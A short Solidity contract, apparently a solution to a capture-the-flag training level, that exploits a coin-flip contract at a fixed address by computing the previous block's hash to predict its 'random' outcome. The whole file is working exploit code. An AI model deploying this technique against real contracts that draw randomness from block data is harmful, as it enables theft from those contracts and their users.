// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipExploit {
    using SafeMath for uint256;

    ICoinFlip constant public DEPLOYED_ADDR = ICoinFlip(0xdBAAd1B6B7dA4fBE7619a27e2190D7731c62b485);
    uint256 constant public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip() public {
        DEPLOYED_ADDR.flip(uint256(blockhash(block.number.sub(1))).div(FACTOR) == 1);
    }
}
